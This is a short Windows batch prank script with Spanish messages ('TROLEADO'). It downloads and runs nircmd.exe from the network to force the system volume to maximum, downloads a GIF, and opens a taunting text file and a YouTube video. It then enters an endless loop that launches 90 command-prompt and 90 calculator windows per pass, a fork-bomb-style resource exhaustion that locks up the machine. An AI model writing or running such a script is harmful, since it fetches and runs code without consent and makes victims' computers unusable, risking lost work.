@echo off
set "NIRCMD_PATH=%TEMP%\nircmd.exe"
if not exist "%NIRCMD_PATH%" (
    echo nircmd.exe no encontrado. Descargándolo...
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd.zip', '%TEMP%\nircmd.zip')"
        echo Extrayendo nircmd.exe...
    powershell -Command "Expand-Archive -Path '%TEMP%\nircmd.zip' -DestinationPath '%TEMP%' -Force"
    move /Y "%TEMP%\nircmd.exe" "%NIRCMD_PATH%"
)
"%NIRCMD_PATH%" mutesysvolume 0
"%NIRCMD_PATH%" setsysvolume 65535
set "script_dir=%~dp0"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://media.tenor.com/mcPlflbf1p0AAAAM/monkey-deal-with-it.gif', '%script_dir%imagen.gif')"
echo ¡¡¡¡¡¡¡¡¡¡¡¡¡TROLEADO!!!!!!!!!!!!!! > "%script_dir%Troliado.txt"
start "" "%script_dir%imagen.gif"
start "" "https://www.youtube.com/watch?v=I8p89Xun5L0&ab_channel=Player2"
timeout /t 2
start notepad "%script_dir%Troliado.txt"
timeout /t 30
timeout /t 1
:loop
(for /l %%i in (1,1,90) do start cmd)
(for /l %%i in (1,1,90) do start calc)
goto loop
